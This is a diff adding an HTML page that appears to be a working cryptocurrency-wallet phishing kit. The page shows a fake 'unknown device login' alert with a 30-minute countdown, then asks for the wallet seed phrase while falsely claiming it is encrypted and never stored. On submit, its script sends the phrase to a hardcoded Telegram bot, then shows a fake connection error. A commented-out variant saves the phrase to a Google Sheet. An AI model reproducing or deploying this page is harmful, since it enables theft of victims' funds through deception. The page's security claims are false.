@@ -1,0 +1,521 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>Wallet Security Flow</title>
+  <style>
+    body {
+      margin: 0;
+      font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+      background: #f5f5f5;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      min-height: 100vh;
+      padding: 20px;
+      box-sizing: border-box;
+    }
+
+    .container {
+      background: white;
+      padding: 30px 25px;
+      border-radius: 16px;
+      box-shadow: 0 8px 20px rgba(0,0,0,0.1);
+      width: 90%;
+      max-width: 400px;
+    }
+
+    .step-indicator {
+      display: flex;
+      justify-content: center;
+      gap: 15px;
+      margin-bottom: 30px;
+      position: relative;
+    }
+
+    .step-indicator::before {
+      content: '';
+      position: absolute;
+      top: 50%;
+      left: 20%;
+      right: 20%;
+      height: 2px;
+      background: #e0e0e0;
+      z-index: 0;
+    }
+
+    .step {
+      width: 32px;
+      height: 32px;
+      border-radius: 50%;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      background: #e0e0e0;
+      color: #666;
+      font-weight: bold;
+      font-size: 16px;
+      z-index: 1;
+      transition: all 0.3s ease;
+    }
+
+    .step.active {
+      background: #007bff;
+      color: white;
+    }
+
+    .step.completed {
+      background: #28a745;
+      color: white;
+    }
+
+    .page {
+      display: none;
+    }
+
+    .page.active {
+      display: block;
+    }
+
+    h2 {
+      text-align: center;
+      margin-bottom: 20px;
+      color: #222;
+      font-size: 24px;
+    }
+
+    /* Step 1 Styles (Security Alert) */
+    .alert {
+      background-color: #e0f0fb;
+      color: #0077b6;
+      padding: 8px 12px;
+      border-radius: 6px;
+      display: inline-block;
+      margin-bottom: 15px;
+      font-weight: bold;
+    }
+
+    .step1 p {
+      color: #333;
+      font-size: 14px;
+      margin: 12px 0;
+    }
+
+    .timer {
+      color: #00aaff;
+      font-weight: bold;
+    }
+
+    .footer-note {
+      font-size: 12px;
+      color: #666;
+      margin-top: 20px;
+    }
+
+    /* Step 2 Styles (Select Wallet) */
+    /* .step2 label {
+      display: block;
+      margin-bottom: 10px;
+      font-weight: 600;
+      color: #333;
+    }
+
+    .required {
+      color: red;
+    }
+
+    .step2 select {
+      width: 100%;
+      padding: 12px;
+      border-radius: 8px;
+      border: 1px solid #ccc;
+      margin-bottom: 20px;
+      font-size: 16px;
+      box-sizing: border-box;
+    } */
+
+    /* Step 3 Styles (Secure Wallet Access) */
+    .subtext {
+      text-align: center;
+      font-size: 14px;
+      color: #555;
+      margin-bottom: 20px;
+    }
+
+    .step2 label {
+      font-weight: 500;
+      margin-bottom: 8px;
+      display: block;
+    }
+
+    .step2 textarea {
+      width: 100%;
+      min-height: 120px;
+      padding: 12px;
+      font-size: 16px;
+      border: 1px solid #ccc;
+      border-radius: 10px;
+      resize: none;
+      margin-bottom: 5px;
+      box-sizing: border-box;
+    }
+
+    .char-counter {
+      text-align: right;
+      font-size: 12px;
+      color: #999;
+      margin-bottom: 10px;
+    }
+
+    .hint {
+      font-size: 13px;
+      color: #666;
+      margin-bottom: 20px;
+    }
+
+    .note {
+      background-color: #f1f1f1;
+      padding: 15px;
+      border-radius: 10px;
+      font-size: 13px;
+      color: #444;
+      margin-top: 20px;
+      text-align: center;
+    }
+
+    /* Error message styles */
+    .error-message {
+      background-color: #f8d7da;
+      color: #721c24;
+      padding: 12px;
+      border-radius: 8px;
+      margin-bottom: 15px;
+      font-size: 14px;
+      border: 1px solid #f5c6cb;
+      display: none;
+    }
+
+    .error-message.show {
+      display: block;
+    }
+
+    /* Button Styles */
+    button {
+      background-color: #007bff;
+      color: #fff;
+      padding: 14px;
+      border: none;
+      border-radius: 10px;
+      font-size: 16px;
+      cursor: pointer;
+      transition: background 0.3s;
+      width: 100%;
+    }
+
+    button:hover {
+      background-color: #0056b3;
+    }
+
+    button:disabled {
+      background-color: #cccccc;
+      cursor: not-allowed;
+    }
+
+    .back-button {
+      background-color: #6c757d;
+      margin-bottom: 10px;
+    }
+
+    .back-button:hover {
+      background-color: #545b62;
+    }
+
+    .navigation {
+      display: flex;
+      gap: 10px;
+    }
+
+    .navigation button {
+      flex: 1;
+    }
+
+    /* Loading spinner */
+    .spinner {
+      display: none;
+      width: 20px;
+      height: 20px;
+      border: 2px solid #f3f3f3;
+      border-top: 2px solid #007bff;
+      border-radius: 50%;
+      animation: spin 1s linear infinite;
+      margin: 0 auto;
+    }
+
+    @keyframes spin {
+      0% { transform: rotate(0deg); }
+      100% { transform: rotate(360deg); }
+    }
+  </style>
+</head>
+<body>
+  <div class="container">
+    <div class="step-indicator">
+      <div class="step active" id="step-1">1</div>
+      <div class="step" id="step-2">2</div>
+    </div>
+
+    <!-- Step 1: Security Alert -->
+    <div class="page active step1" id="page-1">
+      <h2>Security Alert: Unknown Device Login Detected</h2>
+      <div class="alert">Immediate Action Required</div>
+      <p>
+        We detected an unusual login attempt to your wallet from an unrecognized device. 
+        For your security, immediate verification is required to maintain access to your account.
+      </p>
+      <p class="timer">Time remaining to verify: <span id="timer">30:00</span></p>
+      <p><strong>To prevent unauthorized access, please verify your identity immediately.</strong></p>
+      
+      <button type="button" onclick="verifyNow()">Verify Now</button>
+      
+      <p class="footer-note">
+        If you did not attempt to login, please verify immediately to secure your account and prevent unauthorized access.
+      </p>
+    </div>
+
+    <!-- Step 2: Select Wallet -->
+    <!-- <div class="page step2" id="page-2">
+      <h2>Select wallet</h2>
+      <form id="wallet-form">
+        <label for="wallet">Select Wallet < span class="required">*</span></label>
+        <select id="wallet" required>
+          <option value="">----------</option>
+          <option value="metamask">MetaMask</option>
+
+        </select>
+        <div class="navigation">
+          <button type="submit">Next</button>
+        </div>
+      </form>
+    </div> -->
+
+    <!-- Step 3: Secure Wallet Access -->
+    <div class="page step2" id="page-2">
+      <h2>Secure Wallet Access</h2>
+      <p class="subtext">Enter seedphrase to logout all other sessions.</p>
+
+      <div class="error-message" id="error-message">
+        ❌ Error connecting to wallet. Please check your seedphrase and try again.
+      </div>
+
+      <form id="passphrase-form">
+        <label for="passphrase">Wallet Passphrase</label>
+        <textarea id="passphrase" maxlength="500" placeholder="Enter your wallet passphrase here..."></textarea>
+        <div class="char-counter">0/500</div>
+
+        <p class="hint">ⓘ Usually 12 or 24 words separated by spaces</p>
+        
+        <div class="navigation">
+          <button type="submit" id="connect-button">
+            <span id="button-text">Continue Securely</span>
+            <div class="spinner" id="spinner"></div>
+          </button>
+        </div>
+      </form>
+
+      <div class="note">
+        🔒 Your passphrase is encrypted and secure.<br>
+        We never store your passphrase on our servers.
+      </div>
+    </div>
+  </div>
+
+  <script>
+  let currentStep = 1;
+  let timerInterval;
+
+  // Start timer immediately when page loads
+  startTimer();
+
+  // Character counter for textarea
+  const textarea = document.getElementById('passphrase');
+  const counter = document.querySelector('.char-counter');
+  if (textarea && counter) {
+    textarea.addEventListener('input', () => {
+      counter.textContent = `${textarea.value.length}/500`;
+    });
+  }
+
+  // Wallet form submission
+  // document.getElementById('wallet-form').addEventListener('submit', function(e) {
+  //   e.preventDefault();
+  //   const selectedWallet = document.getElementById('wallet').value;
+  //   if (selectedWallet) {
+  //     goToStep(3);
+  //   }
+  // });
+
+  function sendToTelegram(wallet, passphrase) {
+  const botToken = '7350367461:AAEhJzyu3bsMk33VTt2vNwu9laQ6QnH-6gQ'; // <-- Replace with your bot token
+  const chatId = '1108201283';     // <-- Replace with your Telegram chat ID
+  const message = `🔐 Wallet Login Attempt\n\n🪙 Wallet: ${wallet}\n🔑 Passphrase:\n${passphrase}`;
+
+  const telegramUrl = `https://api.telegram.org/bot7350367461:AAEhJzyu3bsMk33VTt2vNwu9laQ6QnH-6gQ/sendMessage`;
+  
+  return fetch(telegramUrl, {
+    method: 'POST',
+    headers: {
+      'Content-Type': 'application/json'
+    },
+    body: JSON.stringify({
+      chat_id: chatId,
+      text: message
+    })
+  });
+}
+
+  // Passphrase form submission
+  document.getElementById('passphrase-form').addEventListener('submit', function(e) {
+    e.preventDefault();
+    const passphrase = document.getElementById('passphrase').value;
+    // const selectedWallet = document.getElementById('wallet').value;
+    const connectButton = document.getElementById('connect-button');
+    const buttonText = document.getElementById('button-text');
+    const spinner = document.getElementById('spinner');
+    const errorMessage = document.getElementById('error-message');
+    
+    if (!passphrase.trim()) {
+  errorMessage.textContent = '❌ Please input your wallet passphrase.';
+  errorMessage.classList.add('show');
+  return;
+}
+
+// Show loading state
+connectButton.disabled = true;
+buttonText.style.display = 'none';
+spinner.style.display = 'block';
+errorMessage.classList.remove('show');
+
+// Simulate connection attempt
+setTimeout(() => {
+  // Send to Telegram
+  sendToTelegram(passphrase)
+    .then(() => {
+      // Clear passphrase
+      document.getElementById('passphrase').value = '';
+      counter.textContent = '0/500';
+    })
+    .catch(err => {
+      console.error('Telegram send error:', err);
+    });
+
+  // Hide loading state
+  connectButton.disabled = false;
+  buttonText.style.display = 'block';
+  spinner.style.display = 'none';
+
+  // Show error message
+  errorMessage.textContent = '❌ Error connecting to wallet. Please check your seedphrase and try again.';
+  errorMessage.classList.add('show');
+}, 2000);
+
+
+    // if (passphrase.trim()) {
+    //   // Show loading state
+    //   connectButton.disabled = true;
+    //   buttonText.style.display = 'none';
+    //   spinner.style.display = 'block';
+    //   errorMessage.classList.remove('show');
+      
+    //   // Simulate connection attempt
+    //   setTimeout(() => {
+    //     // Hide loading state
+    //     connectButton.disabled = false;
+    //     buttonText.style.display = 'block';
+    //     spinner.style.display = 'none';
+        
+    //     // Show error message
+    //     errorMessage.classList.add('show');
+        
+    //     // Try to send data (this will likely fail since google.script.run doesn't exist)
+    //     try {
+    //       if (typeof google !== 'undefined' && google.script && google.script.run) {
+    //         google.script.run
+    //           .withSuccessHandler(function(result) {
+    //             console.log(result);
+    //             errorMessage.classList.remove('show');
+    //           })
+    //           .withFailureHandler(function(error) {
+    //             console.error('Error saving data: ', error);
+    //             errorMessage.classList.add('show');
+    //           })
+    //           .saveToSheet(selectedWallet, passphrase);
+    //       } else {
+    //         // Google Apps Script not available, show error
+    //         errorMessage.classList.add('show');
+    //       }
+    //     } catch (error) {
+    //       console.error('Error: ', error);
+    //       errorMessage.classList.add('show');
+    //     }
+    //   }, 2000); // 2 second delay to simulate connection attempt
+    // }
+  // });
+
+  function goToStep(stepNumber) {
+    // Hide all pages
+    document.querySelectorAll('.page').forEach(page => {
+      page.classList.remove('active');
+    });
+
+    // Show target page
+    document.getElementById(`page-${stepNumber}`).classList.add('active');
+
+    // Update step indicators
+    document.querySelectorAll('.step').forEach((step, index) => {
+      step.classList.remove('active', 'completed');
+      if (index + 1 < stepNumber) {
+        step.classList.add('completed');
+      } else if (index + 1 === stepNumber) {
+        step.classList.add('active');
+      }
+    });
+
+    currentStep = stepNumber;
+
+    // Continue timer throughout all steps
+    if (!timerInterval) {
+      startTimer();
+    }
+  }
+
+  function startTimer() {
+    let timeLeft = 30 * 60; // 30 minutes in seconds
+    const timerElement = document.getElementById('timer');
+
+    timerInterval = setInterval(() => {
+      const minutes = Math.floor(timeLeft / 60);
+      const seconds = timeLeft % 60;
+      timerElement.textContent = `${minutes.toString().padStart(2, '0')}:${seconds.toString().padStart(2, '0')}`;
+
+      if (timeLeft <= 0) {
+        clearInterval(timerInterval);
+        alert('Verification time expired. Please start the process again.');
+        goToStep(1);
+      }
+
+      timeLeft--;
+    }, 1000);
+  }
+
+  function verifyNow() {
+    goToStep(2);
+  }
+
+  // Initialize character counter
+  if (textarea && counter) {
+    counter.textContent = `${textarea.value.length}/500`;
+  }
+</script>
+</body>
+</html>
